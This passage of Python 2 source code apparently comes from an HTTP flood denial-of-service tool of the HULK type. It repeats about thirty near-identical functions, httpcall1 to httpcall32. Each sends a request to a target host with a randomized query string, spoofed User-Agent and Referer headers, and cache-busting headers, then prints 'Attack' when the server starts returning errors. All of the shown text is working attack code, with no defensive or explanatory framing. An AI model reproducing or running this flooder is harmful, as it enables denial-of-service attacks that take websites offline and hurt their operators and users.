		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		
	
def httpcall2(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall3(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall4(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall5(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall6(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall7(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall8(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall9(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall10(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall11(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		
	
def httpcall12(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall13(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall14(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall15(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall16(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall17(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall18(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall19(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall20(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall21(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall22(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall23(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall24(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall25(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall26(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall27(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall28(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall29(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall30(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall31(url):
	useragent_list()
	referer_list()
	user_agent = random.choice(useragents)
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents) + random.choice(useragents) + random.choice(useragentsi))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + random.choice(referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print "Attack"
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

def httpcall32(url):
	useragent_list()
	referer_list()
